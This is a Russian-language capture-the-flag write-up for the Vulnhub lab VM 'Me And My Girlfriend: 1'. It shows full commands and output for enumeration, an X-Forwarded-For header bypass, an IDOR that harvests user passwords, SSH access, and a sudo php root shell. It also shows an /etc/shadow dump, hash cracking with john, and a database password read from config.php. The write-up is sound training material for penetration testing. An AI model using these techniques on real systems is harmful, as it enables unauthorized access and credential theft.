# Me And My Girlfriend: 1
## Vulnhub machine

- Название: Me And My Girlfriend: 1
- OS: Linux
- Ресурс: Vulnhub
- Сложность: Beginning
- Дата релиза: 13.12.19
- Оригинальное описание: 
>Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your help to get what Alice is hiding and get full access to the company!
Difficulty Level: Beginner
Notes: there are 2 flag files
Learning: Web Application | Simple Privilege Escalation


## Write-up

```html
┌─[root@parrot]─[~]
└──╼ #nmap -p- -A 192.168.56.124
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 08:34 AKDT
Nmap scan report for mygf (192.168.56.124)
Host is up (0.00068s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:5A:8A:AE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms mygf (192.168.56.124)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds
```

>Ничего необычного, идем дальше.

```html 
┌─[root@parrot]─[~]
└──╼ #dirb http://192.168.56.124/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon May  4 08:36:17 2020
URL_BASE: http://192.168.56.124/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.124/ ----
==> DIRECTORY: http://192.168.56.124/config/                                                 
+ http://192.168.56.124/index.php (CODE:200|SIZE:120)                                        
==> DIRECTORY: http://192.168.56.124/misc/                                                   
+ http://192.168.56.124/robots.txt (CODE:200|SIZE:32)                                        
+ http://192.168.56.124/server-status (CODE:403|SIZE:294)                                    
                                                                                             
---- Entering directory: http://192.168.56.124/config/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                             
---- Entering directory: http://192.168.56.124/misc/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Mon May  4 08:36:21 2020
DOWNLOADED: 4612 - FOUND: 3
```

>robots.txt привел к другому файлу - heyhoo.txt:

>Great! What you need now is reconn, attack and got the shell

>А на главной странице в исходнике можно найти комментарий:
>-- Maybe you can search how to use x-forwarded-for --

>X-Forwarded-For - это заголовок для идентификации происхождения IP-адреса клиента. При попытке просмотра главной страницы, на ней видим:

>Who are you? Hacker? Sorry This Site Can Only Be Accessed local!

>Далее я использовал burp, добавив к запросу следующую строку:
>X-Forwarded-For: localhost

>Должно получиться что-то вроде:

```html
GET / HTTP/1.1
Host: 192.168.56.124
X-Forwarded-For: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

>Жмем "Forward" и видим сайт. В целом ничего, попытки перебора паролей оказались бесполезны. Поэтому регаемся. В юрл видно номер нашего пользователя в системе:

>http://192.168.56.124/index.php?page=dashboard&user_id=12

>Начав с еденицы, удалось собрать пароли пользователей:

```html
http://192.168.56.124/index.php?page=profile&user_id=1
Name:     Eweuh Tandingan
Username: eweuhtandingan
Password: skuyatuh

http://192.168.56.124/index.php?page=profile&user_id=2
Name:     Aing Maung
Username: aingmaung
Password: qwerty!!!

http://192.168.56.124/index.php?page=profile&user_id=3
Name:     Sunda Tea
Username: sundatea
Password: indONEsia

http://192.168.56.124/index.php?page=profile&user_id=4
Name:     Sedih Aing Mah
Username: sedihaingmah
Password: cedihhihihi

http://192.168.56.124/index.php?page=profile&user_id=5
Name:     Alice Geulis
Username: alice
Password: 4li**
```

>Перебрав пароли, получаем доступ как Alice:

```html
┌─[✗]─[root@parrot]─[~]
└──╼ #ssh alice@192.168.56.124
The authenticity of host '192.168.56.124 (192.168.56.124)' can't be established.
ECDSA key fingerprint is SHA256:lE5D8AvkJqcIwHiNuI9aSnC3ohlDrhPhjDljqSDy9sY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.124' (ECDSA) to the list of known hosts.
alice@192.168.56.124's password: 
Last login: Fri Dec 13 14:48:25 2019
alice@gfriEND:~$ id
uid=1000(alice) gid=1001(alice) groups=1001(alice)
```

>И находим первый флаг:

```html
alice@gfriEND:~$ ls -la
total 32
drwxr-xr-x 4 alice alice 4096 Dec 13 14:47 .
drwxr-xr-x 6 root  root  4096 Dec 13 12:18 ..
-rw------- 1 alice alice   10 Dec 13 14:48 .bash_history
-rw-r--r-- 1 alice alice  220 Dec 13 12:16 .bash_logout
-rw-r--r-- 1 alice alice 3637 Dec 13 12:16 .bashrc
drwx------ 2 alice alice 4096 Dec 13 12:43 .cache
drwxrwxr-x 2 alice alice 4096 Dec 13 14:10 .my_secret
-rw-r--r-- 1 alice alice  675 Dec 13 12:16 .profile
alice@gfriEND:~$ cd .my_secret
alice@gfriEND:~/.my_secret$ ls
flag1.txt  my_notes.txt
alice@gfriEND:~/.my_secret$ cat my_notes.txt
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf**********}
```

>Просмотрим разрешения для нашего юзера:

```html
alice@gfriEND:~$ sudo -l
Matching Defaults entries for alice on gfriEND:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on gfriEND:
    (root) NOPASSWD: /usr/bin/php
```

>Вызовем оболочку от root с помощью php:


```html 
alice@gfriEND://$ sudo /usr/bin/php -r "system('/bin/bash');"
```

>И берем второй флаг:

```html
root@gfriEND:/# cd root
root@gfriEND:/root# ls
flag2.txt
root@gfriEND:/root# cat flag2.txt

  ________        __    ___________.__             ___________.__                ._.
 /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
 \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
        \/                              \/     \/       \/              \//_____/ \/

Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)

Contact me if you want to contribute / give me feedback / share your writeup!
Twitter: @makegreatagain_
Instagram: @aldodimas73

Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
root@gfriEND:/root# id
uid=0(root) gid=0(root) groups=0(root)
```

>После я хотел получить сам пароль root.

```html
root@gfriEND:/# cat etc/shadow
root:$6$j3OVyT76$XgTZVYI4tTaW8H00hanWrlDv2T49i663hXyza8A08CdkSEnVecTgR7CGNbaK8xKSRt.IYdalnCpYLHwPjSW48/:18243:0:99999:7:::
daemon:*:17959:0:99999:7:::
bin:*:17959:0:99999:7:::
sys:*:17959:0:99999:7:::
sync:*:17959:0:99999:7:::
games:*:17959:0:99999:7:::
man:*:17959:0:99999:7:::
lp:*:17959:0:99999:7:::
mail:*:17959:0:99999:7:::
news:*:17959:0:99999:7:::
uucp:*:17959:0:99999:7:::
proxy:*:17959:0:99999:7:::
www-data:*:17959:0:99999:7:::
backup:*:17959:0:99999:7:::
list:*:17959:0:99999:7:::
irc:*:17959:0:99999:7:::
gnats:*:17959:0:99999:7:::
nobody:*:17959:0:99999:7:::
libuuid:!:17959:0:99999:7:::
syslog:*:17959:0:99999:7:::
messagebus:*:18243:0:99999:7:::
landscape:*:18243:0:99999:7:::
bob:$6$aAzIW6D0$GYqdyqlSeU/A81xnMnqYI9iUOSbZbsn0motz5A7l1zBmQh1EBRMQ0ZCpt7O8snwKFehLLZrlKys04c6aOJAJB/:18243:0:99999:7:::
alice:$6$/R.qPBes$cS8fBXsEjNOKNfeuGD585HeCkEG1ayMiMah7wgYwvnLfvk9bLv7H2viHOQVwM/EFSGcx6ENZrhdTNsMLtOusS/:18243:0:99999:7:::
eweuhtandingan:$6$H59cpFOf$jfcHyJQhM6izoVwU9ZjKCH8priJvtyyvKXGX5kY7qkDiWZulxwcccvZiQK42VK.ypJG0AzgpAL97xofFLBZpi.:18243:0:99999:7:::
aingmaung:$6$l8sj1RAp$iyVxBjqX5vuhZYcSrfyrJoxQZVy3m/uibRkZ.yU5DM8U0fI/j5Itp5pbuPSqNP1EvjagcXDNrBIpARMWkP1tN1:18243:0:99999:7:::
sundatea:$6$OB3mKyCI$8WzBLqhepFSC0y9D8L27wlbCQhW75mARV0elpz7JBH6hPPfxU984SJXE5OgpVdFwtpB4xIJlOfREVkBA46C0D0:18243:0:99999:7:::
sshd:*:18243:0:99999:7:::
mysql:!:18243:0:99999:7:::<
```

>Сохранил хэш в файл и пытался перебрать с помощью john:

```html
┌─[user@parrot]─[~/Downloads]
└──╼ $john hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
```

>Из этого ничего не вышло, но все можно было сделать проще, т.к. пароль root хранился в файле config.php

```html
root@gfriEND://var/www/html/config# cat config.php 
?php

    $conn = mysqli_connect('localhost', 'root', 'ctf_pasti_bisa', 'ceban_corp');

alice@gfriEND://var/www/html/config$ su 
Password:
root@gfriEND://var/www/html/config# id
uid=0(root) gid=0(root) groups=0(root)
```
